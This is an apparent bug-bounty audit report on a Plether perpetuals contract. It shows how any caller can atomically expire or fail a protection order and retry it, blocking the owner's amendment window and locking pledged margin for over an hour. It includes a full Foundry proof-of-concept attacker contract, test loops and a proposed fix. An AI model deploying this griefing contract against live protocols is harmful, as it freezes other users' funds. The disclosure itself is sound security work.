# \#97802 [SC-High] Permissionless atomic retries consume the Latched amendment window and lock protected position margin

**Submitted on Nov 3rd 2026 at 09:14:53 UTC by @coinsspor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97802
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Temporary freezing of funds for at least 1 hour

## Description

## Brief/Intro

`PositionProtectionBook` gives the protection owner exactly one state in which stale close limits can be repaired: `Latched`. However, any address can terminalize a failed/expired protection child and call the permissionless `retryPositionProtectionClose()` in the same transaction, changing `Triggered -> Latched -> Triggered` before the owner can submit a transaction. Repeating this sequence keeps an EOA trader's protection active, makes owner amendment, cancellation, and ordinary full-close commitment revert, and leaves the position and its pledged USDG margin locked. The runnable PoC maintains this state for 3,721 seconds, with `1,986e6` USDG atoms of pledged margin unchanged, and also demonstrates ten fail/retry cycles inside one transaction during frozen-market operation.

## Vulnerability Details

### Root cause

The MED-9 fix retains trader-selected close limits and added an owner-only amendment function for failed protection attempts. That amendment is available only when the protection is `Latched` and has no pending child:

```solidity
function amendLatchedPositionProtectionCloseLimits(
    uint64 protectionId,
    PositionProtectionTypes.CloseFinancialLimits calldata limits
) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    _setCloseLimits(protection, limits);
    _emitCloseLimitsUpdated(protection);
}
```

Source: `PositionProtectionBook.sol:315-327`.

When a child terminally fails and the protected position still matches, the Router callback temporarily relatches the protection:

```solidity
delete _attemptProtectionIds[orderId];
retained = _positionMatches(protection);
emit PositionProtectionCloseAttemptFailed(protectionId, account, orderId, reason, retained);
if (retained) {
    protection.status = PositionProtectionTypes.PositionProtectionStatus.Latched;
    return true;
}
```

Source: `PositionProtectionBook.sol:662-667`.

The same `Latched` state is also consumed by a permissionless retry. It requires no owner authorization:

```solidity
function retryPositionProtectionClose(
    uint64 protectionId
) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    _requireMatchingPosition(protection);

    IPositionProtectionRouterHost router = IPositionProtectionRouterHost(ROUTER);
    if (router.pendingOrderCounts(protection.account) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }

    // ...commit a fresh child...
    _recordCloseAttempt(protection, linkedOrderId);
}
```

Source: `PositionProtectionBook.sol:382-405`.

`_recordCloseAttempt()` records the new child and returns the protection to `Triggered`. Therefore an attacker contract can perform this atomic sequence:

```text
Triggered(child N)
    -> router.expireOrder(child N) or terminally failing executeOrder(child N)
    -> handleFailedProtectionAttempt(): Triggered -> Latched
    -> retryPositionProtectionClose(): Latched -> Triggered(child N+1)
```

There is no transaction boundary at `Latched`. An EOA owner cannot insert an amendment call between the two attacker calls. Calling through a helper does not solve this because the owner check observes the helper as `msg.sender`.

### Concrete numeric execution

The PoC uses:

| Variable | Value |
|---|---:|
| Position size | `10_000e18` |
| Requested opening-margin delta | `2_000e6` USDG atoms |
| Actual post-open pledged margin | `1_986e6` USDG atoms |
| Initial mark | `100_000_000` |
| LONG take-profit trigger | `90_000_000` |
| Required close execution notional | `(10_000e18 * 90_000_000) / 1e20 = 9_000e6` USDG atoms |
| Retained maximum execution notional | `9_000e6 - 1` USDG atoms |

The one-atom-too-low ceiling is valid user configuration and makes the real policy evaluator return terminal `ConstraintViolation`. In production, a previously usable ceiling can similarly become persistently insufficient because notional, fees, carry, or frozen-close economics change before execution. The official MED-9 response explicitly says tight limits may prevent execution until conditions improve or the owner amends them.

The attacker helper first executes the failing child, causing the real Router callback to relatch it, and then immediately retries it. At the end of the attacker transaction:

```text
protection.status             = Triggered
pendingOrderCounts(account)   = 1
linkedOrderId                 = fresh authenticated child ID
retained close limits         = unchanged failing limits
position.size                 = 10_000e18
position.margin               = 1_986e6
```

The owner then attempts all normal recovery paths:

```text
amendLatchedPositionProtectionCloseLimits -> ProtectionNotLatched
ordinary full-close commit                 -> ProtectionActive
cancelPositionProtection                   -> ProtectionNotArmed
```

Cancellation is limited to `PendingOpen` and `Armed`, and ordinary order admission rejects any account with active protection. Liquidation is not a reasonable owner recovery path and may itself impose financial loss.

### More-than-one-hour repetition

Every internally generated protection child uses the production-default 60-second execution window. The attacker waits until `executionDeadline + 1` and atomically calls `expireOrder()` followed by `retryPositionProtectionClose()`.

Each cycle advances 61 seconds and leaves exactly one fresh child live:

```text
61 cycles * 61 seconds = 3,721 seconds > 3,600 seconds
```

After all 61 cycles, the PoC asserts that:

- every old child terminalized as `Expired`;
- every retry produced a strictly greater authenticated order ID;
- protection status remained `Triggered` at each externally visible boundary;
- the owner amendment reverted after every cycle;
- pending count stayed exactly one;
- position size remained `10_000e18`; and
- the full post-open pledged margin remained exactly `1_986e6` USDG atoms.

### Frozen-market amplification

Frozen execution intentionally skips the live-market same-block and post-commit publish-time guards:

```solidity
if (!request.oracleFrozen && ExecutionBlockNumberLib.current() == order.commitBlock) {
    return _pendingResult(order.orderId, OrderV3Types.PendingReason.SameBlock);
}
if (!request.oracleFrozen && request.oraclePublishTime <= order.commitTime) {
    return _pendingResult(order.orderId, OrderV3Types.PendingReason.MevBoundary);
}
```

Consequently, after expiring the initial child, the second PoC performs ten genuine `executeOrder -> ConstraintViolation -> retry` cycles inside one attacker transaction and leaves the eleventh child live. This shows that the attack does not even require 60-second pacing during routine frozen-market periods.

### Why this is not the disclosed MED-9 root cause

MED-9 reported that protection children had no trader-selected financial ceilings. This report relies on the frozen MED-9 fix working correctly: the retained limit rejects the close exactly as configured. The independent defect is that an arbitrary caller can atomically starve the newly added owner-only remediation state.

This report does not claim that permissionless retry itself is a vulnerability. The vulnerability is the absence of any owner-priority/remediation mechanism when permissionless retry and owner amendment compete for the same transient `Latched` state.

The repository's own integration guidance says that after a queued close fails, "the owner may amend its limits before retrying." The demonstrated atomic sequence makes that stated recovery ordering unavailable to an EOA owner.

## Impact Details

The selected impacts are:

1. **Griefing** — the attacker has no profit motive but can deliberately keep another user's position and pledged collateral locked while forcing continued market, carry, and liquidation exposure.
2. **Temporary freezing of funds for at least 1 hour** — the PoC maintains the blocked owner exit and unchanged `1_986e6` USDG pledged margin for 3,721 seconds.

The attacker needs no privileged role, victim approval, USDG, oracle authority, or access to Plether's private services. Retry is permissionless and nonpayable. The repeatable expiry path is oracle-free and each new child has zero execution bounty; the attacker pays only transaction gas.

The attack has no protocol repetition limit. Every retry receives a fresh order ID and deadline, while pending count remains one, so the per-account pending-order cap does not stop it. The victim cannot repair the stale limits, cancel the triggered protection, or submit an ordinary close. The only eventual involuntary exit may be liquidation, which is not a reasonable recovery and can cause additional loss.

Medium is claimed conservatively. No direct theft, insolvency, permanent freeze, or 24-hour High-severity freeze is claimed.

## Recommended Fix

The simplest robust fix is to let the owner update the retained limits while the protection is either `Latched` **or `Triggered`.** If a child is already pending, the update must not mutate that child's immutable bounds; it should apply only to future retry children. Once the owner's transaction lands, any later permissionless retry necessarily copies the repaired retained limits, so a keeper cannot starve remediation.

Conceptually:

```solidity
StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
PositionProtectionStatus status = protection.status;
if (status != PositionProtectionStatus.Latched && status != PositionProtectionStatus.Triggered) {
    revert OrderRouter__ProtectionNotAmendable();
}
if (status == PositionProtectionStatus.Latched && router.pendingOrderCounts(msg.sender) != 0) {
    revert OrderRouter__PendingOrdersExist();
}
// A Triggered amendment updates retained limits only; the current child remains immutable.
_setCloseLimits(protection, limits);
_emitCloseLimitsUpdated(protection);
```

Alternatives are an owner-exclusive grace period after relatching, or an owner-only composite function that expires a child and amends the retained limits atomically. Regression coverage should include a foreign helper that terminalizes and retries within one transaction.

## References

- Frozen in-scope repository: https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- Owner amendment and permissionless retry: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L405
- Failed-child relatch transition: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L637-L667
- Active-protection order lock: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313-L315
- Default 60-second execution window: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderExecutionOrchestrator.sol#L10-L14
- Canonical position-protection entrypoints: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#position-protection
- Keeper guidance for persistent protection failures: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#position-protection-keepers
- Previous audits, including MED-9: https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits



## Proof of Concept

# Proof of Concept

## Summary of what this PoC proves

This Foundry PoC runs against the exact in-scope commit without modifying any contract under `packages/perps/src`. It proves four properties:

1. A foreign caller can terminalize a protection child and permissionlessly retry it in the same transaction, consuming the transient `Latched` owner-amendment state.
2. While the attacker-maintained child is live, owner amendment, ordinary full-close commitment, and owner cancellation all revert, while the position size and pledged margin remain unchanged.
3. Sixty-one atomic expiry/retry cycles sustain this state for at least 3,721 seconds, exceeding the program's one-hour Medium threshold.
4. During frozen-market operation, ten genuine fail/retry cycles can execute inside one transaction and leave the eleventh child live.

The negative/control test proves that owner amendment succeeds and is copied into the next child when a foreign caller does not consume the `Latched` state.

## Environment

```text
Repository: https://github.com/immunefi-team/audit-comp-plether
Frozen commit: a82d4fefb02768e5b3bddcc97dee371eee24fea8
Forge: 1.5.1-v1.5.1
Solidity: 0.8.35+commit.47b9dedd
Profile: quick
Compilation: via-IR
Network required: no
Fork required: no
```

## Setup

```bash
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/perps/research
```

Create this file:

```text
packages/perps/test/perps/research/BlackspawnProtectionRetryRaceResearch.t.sol
```

with the following complete contents:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionTest} from "../spec/trader/PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";

interface IBlackspawnOrderExecutor {

    function executeOrder(
        uint64 orderId,
        bytes[] calldata pythUpdateData
    ) external payable returns (OrderV3Types.ExecutionResult memory result);

    function expireOrder(
        uint64 orderId
    ) external returns (OrderV3Types.ExecutionResult memory result);

}

contract AtomicProtectionRetryGriefer {

    function failAndRetry(
        IBlackspawnOrderExecutor router,
        IPositionProtectionActions actions,
        uint64 orderId,
        uint64 protectionId,
        bytes[] calldata pythUpdateData
    ) external payable returns (OrderV3Types.ExecutionResult memory result, uint64 retryOrderId) {
        result = router.executeOrder{value: msg.value}(orderId, pythUpdateData);
        retryOrderId = actions.retryPositionProtectionClose(protectionId);
    }

    function expireAndRetry(
        IBlackspawnOrderExecutor router,
        IPositionProtectionActions actions,
        uint64 orderId,
        uint64 protectionId
    ) external returns (OrderV3Types.ExecutionResult memory result, uint64 retryOrderId) {
        result = router.expireOrder(orderId);
        retryOrderId = actions.retryPositionProtectionClose(protectionId);
    }

    function expireThenFrozenFailRetryLoop(
        IBlackspawnOrderExecutor router,
        IPositionProtectionActions actions,
        uint64 expiredOrderId,
        uint64 protectionId,
        uint256 cycles
    ) external returns (uint64 liveOrderId) {
        router.expireOrder(expiredOrderId);
        liveOrderId = actions.retryPositionProtectionClose(protectionId);
        bytes[] memory noUpdateData = new bytes[](0);
        for (uint256 cycle; cycle < cycles; ++cycle) {
            router.executeOrder(liveOrderId, noUpdateData);
            liveOrderId = actions.retryPositionProtectionClose(protectionId);
        }
    }

}

contract BlackspawnProtectionRetryRaceResearchTest is PositionProtectionTest {

    function test_AtomicPermissionlessRetryErasesOwnerAmendmentWindow() public {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        (, uint256 pledgedMarginBefore,,,,,) = engine.positions(ALICE);

        PositionProtectionTypes.PositionProtectionParams memory params = _params(LONG_TAKE_PROFIT, 0);
        uint256 executionNotionalAssets = (POSITION_SIZE * LONG_TAKE_PROFIT) / 1e20;
        params.closeLimits.maxExecutionNotionalAssets = executionNotionalAssets - 1;

        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);
        uint64 firstOrderId = _triggerAt(protectionId, LONG_TAKE_PROFIT);

        AtomicProtectionRetryGriefer griefer = new AtomicProtectionRetryGriefer();
        bytes[] memory firstExecutionData = _mockPythUpdateData(LONG_TAKE_PROFIT);
        (OrderV3Types.ExecutionResult memory firstResult, uint64 retryOrderId) = griefer.failAndRetry(
            IBlackspawnOrderExecutor(address(router)),
            protectionActions,
            firstOrderId,
            protectionId,
            firstExecutionData
        );

        assertEq(uint8(firstResult.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(firstResult.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "same transaction must consume the transient Latched amendment window"
        );
        assertEq(router.pendingOrderCounts(ALICE), 1);
        _assertPendingCloseLimits(retryOrderId, params.closeLimits);

        PositionProtectionTypes.CloseFinancialLimits memory repairedLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, repairedLimits);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(CfdTypes.Side.LONG, POSITION_SIZE, 0, 0, true);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(protectionId);

        bytes[] memory secondExecutionData = _mockPythUpdateData(LONG_TAKE_PROFIT);
        (OrderV3Types.ExecutionResult memory secondResult, uint64 secondRetryOrderId) = griefer.failAndRetry(
            IBlackspawnOrderExecutor(address(router)),
            protectionActions,
            retryOrderId,
            protectionId,
            secondExecutionData
        );
        assertEq(uint8(secondResult.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertGt(secondRetryOrderId, retryOrderId, "griefer can repeat with fresh authenticated order ids");
        assertEq(router.pendingOrderCounts(ALICE), 1, "victim remains bound to one attacker-refreshed child");
        (uint256 remainingSize, uint256 remainingMargin,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, POSITION_SIZE, "position remains open across repeated atomic cycles");
        assertEq(remainingMargin, pledgedMarginBefore, "the full post-open pledged margin remains locked");
    }

    function test_ControlOwnerCanAmendWhenPermissionlessRetryDoesNotConsumeWindow() public {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _params(LONG_TAKE_PROFIT, 0);
        uint256 executionNotionalAssets = (POSITION_SIZE * LONG_TAKE_PROFIT) / 1e20;
        params.closeLimits.maxExecutionNotionalAssets = executionNotionalAssets - 1;

        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);
        uint64 firstOrderId = _triggerAt(protectionId, LONG_TAKE_PROFIT);
        bytes[] memory executionData = _mockPythUpdateData(LONG_TAKE_PROFIT);
        vm.prank(EXECUTION_KEEPER);
        router.executeOrder(firstOrderId, executionData);

        PositionProtectionTypes.CloseFinancialLimits memory repairedLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, repairedLimits);

        vm.prank(CAROL);
        uint64 retryOrderId = protectionActions.retryPositionProtectionClose(protectionId);
        _assertPendingCloseLimits(retryOrderId, repairedLimits);
    }

    function test_AtomicExpiryRetryCanDenyAmendmentForMoreThanOneHour() public {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        (, uint256 pledgedMarginBefore,,,,,) = engine.positions(ALICE);

        PositionProtectionTypes.PositionProtectionParams memory params = _params(LONG_TAKE_PROFIT, 0);
        uint256 executionNotionalAssets = (POSITION_SIZE * LONG_TAKE_PROFIT) / 1e20;
        params.closeLimits.maxExecutionNotionalAssets = executionNotionalAssets - 1;

        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);
        uint64 liveOrderId = _triggerAt(protectionId, LONG_TAKE_PROFIT);
        // Read through Vm because viaIR may reuse block.timestamp across the
        // vm.warp calls below, which would make the elapsed-time assertion stale.
        uint256 attackStart = vm.getBlockTimestamp();

        PositionProtectionTypes.CloseFinancialLimits memory repairedLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
        AtomicProtectionRetryGriefer griefer = new AtomicProtectionRetryGriefer();

        for (uint256 cycle; cycle < 61; ++cycle) {
            uint64 deadline = router.lifecycleBook().orderTiming(liveOrderId).executionDeadline;
            vm.warp(uint256(deadline) + 1);

            (OrderV3Types.ExecutionResult memory expiryResult, uint64 retryOrderId) = griefer.expireAndRetry(
                IBlackspawnOrderExecutor(address(router)), protectionActions, liveOrderId, protectionId
            );
            assertEq(uint8(expiryResult.status), uint8(OrderV3Types.LifecycleStatus.Failed));
            assertEq(uint8(expiryResult.terminalReason), uint8(OrderV3Types.TerminalReason.Expired));
            assertGt(retryOrderId, liveOrderId, "each cycle must create a fresh authenticated child");
            assertEq(
                uint8(protectionViews.getPositionProtection(protectionId).status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
                "atomic retry must erase Latched before the owner can amend"
            );
            assertEq(router.pendingOrderCounts(ALICE), 1, "exactly one attacker-refreshed child must remain live");

            vm.prank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, repairedLimits);

            liveOrderId = retryOrderId;
        }

        assertGe(
            vm.getBlockTimestamp() - attackStart,
            3600,
            "permissionless cycles must sustain the freeze beyond one hour"
        );
        (uint256 remainingSize, uint256 remainingMargin,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, POSITION_SIZE, "the protected position must remain open after all griefing cycles");
        assertEq(remainingMargin, pledgedMarginBefore, "the full post-open pledged margin must remain locked");
        _assertPendingCloseLimits(liveOrderId, params.closeLimits);
    }

    function test_FrozenModeAllowsMultipleFailRetryCyclesInsideOneTransaction() public {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);

        PositionProtectionTypes.PositionProtectionParams memory params = _params(LONG_TAKE_PROFIT, 0);
        uint256 executionNotionalAssets = (POSITION_SIZE * LONG_TAKE_PROFIT) / 1e20;
        params.closeLimits.maxExecutionNotionalAssets = executionNotionalAssets - 1;

        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);
        uint64 expiredOrderId = _triggerAt(protectionId, LONG_TAKE_PROFIT);

        vm.warp(FRIDAY_FAD_START - 1);
        _refreshMark(LONG_TAKE_PROFIT);
        vm.warp(FRIDAY_FAD_START + 3 hours);
        assertTrue(engine.isOracleFrozen(), "fixture must use the production frozen execution branch");

        AtomicProtectionRetryGriefer griefer = new AtomicProtectionRetryGriefer();
        uint64 firstUncommittedOrderId = router.nextCommitId();
        uint64 liveOrderId = griefer.expireThenFrozenFailRetryLoop(
            IBlackspawnOrderExecutor(address(router)), protectionActions, expiredOrderId, protectionId, 10
        );

        assertEq(
            liveOrderId,
            firstUncommittedOrderId + 10,
            "one transaction must terminalize ten fresh children and leave the eleventh live"
        );
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered)
        );
        assertEq(router.pendingOrderCounts(ALICE), 1);
        (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, POSITION_SIZE);

        PositionProtectionTypes.CloseFinancialLimits memory repairedLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, repairedLimits);
    }

}
```

## Run the PoC

Run all four PoC/control tests:

```bash
FOUNDRY_PROFILE=quick forge test --offline --root packages/perps \
  --match-path 'test/perps/research/BlackspawnProtectionRetryRaceResearch.t.sol' \
  --match-test 'test_(Atomic|Control|Frozen)' -vv
```

Run the complete file, including the imported official position-protection regression suite:

```bash
FOUNDRY_PROFILE=quick forge test --offline --root packages/perps \
  --match-path 'test/perps/research/BlackspawnProtectionRetryRaceResearch.t.sol' -vv
```

## Actual output

Focused decisive test results:

```text
[PASS] test_AtomicExpiryRetryCanDenyAmendmentForMoreThanOneHour() (gas: 49205515)
[PASS] test_AtomicPermissionlessRetryErasesOwnerAmendmentWindow() (gas: 4817837)
[PASS] test_ControlOwnerCanAmendWhenPermissionlessRetryDoesNotConsumeWindow() (gas: 3534268)
[PASS] test_FrozenModeAllowsMultipleFailRetryCyclesInsideOneTransaction() (gas: 12504367)
```

Complete regression result:

```text
Ran 108 tests for test/perps/research/BlackspawnProtectionRetryRaceResearch.t.sol:BlackspawnProtectionRetryRaceResearchTest
Suite result: ok. 108 passed; 0 failed; 0 skipped; finished in 4.06s (8.22s CPU time)
Ran 1 test suite in 4.07s (4.06s CPU time): 108 tests passed, 0 failed, 0 skipped (108 total tests)
```

The test was also executed in a network-disabled bubblewrap environment with the frozen repository mounted read-only and only scratch `out`/`cache` directories writable. No public testnet or production transaction was sent.

## Important assertions and why they matter

### The failing financial limit is real

```solidity
uint256 executionNotionalAssets = (POSITION_SIZE * LONG_TAKE_PROFIT) / 1e20;
params.closeLimits.maxExecutionNotionalAssets = executionNotionalAssets - 1;
```

This produces a required notional of `9_000e6` and a limit of `8_999_999_999` atoms. The real Router/policy path returns `ConstraintViolation`; the PoC does not mock or bypass in-scope validation.

### The owner amendment state is consumed atomically

```solidity
result = router.executeOrder(orderId, pythUpdateData);
retryOrderId = actions.retryPositionProtectionClose(protectionId);
```

The first call causes `Triggered -> Latched`; the second call consumes `Latched -> Triggered` before the attacker's transaction ends.

### Normal owner recovery paths are unavailable

```solidity
vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, repairedLimits);

vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
router.commitOrder(CfdTypes.Side.LONG, POSITION_SIZE, 0, 0, true);

vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
protectionActions.cancelPositionProtection(protectionId);
```

### Funds remain attached to the blocked position

```solidity
(, uint256 pledgedMarginBefore,,,,,) = engine.positions(ALICE);
// ...61 attack cycles...
(uint256 remainingSize, uint256 remainingMargin,,,,,) = engine.positions(ALICE);
assertEq(remainingSize, POSITION_SIZE);
assertEq(remainingMargin, pledgedMarginBefore);
```

For the concrete fixture, `pledgedMarginBefore == 1_986e6` USDG atoms.

### More than one hour is proven

```solidity
for (uint256 cycle; cycle < 61; ++cycle) {
    uint64 deadline = router.lifecycleBook().orderTiming(liveOrderId).executionDeadline;
    vm.warp(uint256(deadline) + 1);
    // expire + retry atomically
}
assertGe(vm.getBlockTimestamp() - attackStart, 3600);
```

With a 60-second child window and strict expiry at `deadline + 1`, the sequence spans at least `61 * 61 = 3,721` seconds.

## Negative/control test

`test_ControlOwnerCanAmendWhenPermissionlessRetryDoesNotConsumeWindow()` terminally fails the same one-atom-too-low protection child but does not let a foreign helper immediately retry. The owner then successfully changes all four retained limits to `uint256.max`, and a later permissionless retry copies the repaired limits.

This control shows that:

- the fixture creates a valid amendable protection;
- the owner function works in isolation;
- the failure is specifically caused by the attacker's atomic ordering; and
- the result is not a mock artifact or an inherently unamendable configuration.

## Recommended remediation

Permit the owner to amend retained future-retry limits while the protection is `Triggered` as well as `Latched`. A `Triggered` amendment must not modify the immutable bounds of the already committed child; it should update only `StoredProtection.closeLimits`, which the next retry copies. This ensures that once the owner's transaction is included, a permissionless caller cannot continue copying the stale limits.

Alternative mitigations are:

- an owner-exclusive grace period after relatching before permissionless retry becomes available; or
- an owner-only composite entrypoint that expires a child and amends retained limits atomically.

Add regression coverage where a foreign helper terminalizes a child and calls retry in the same transaction.


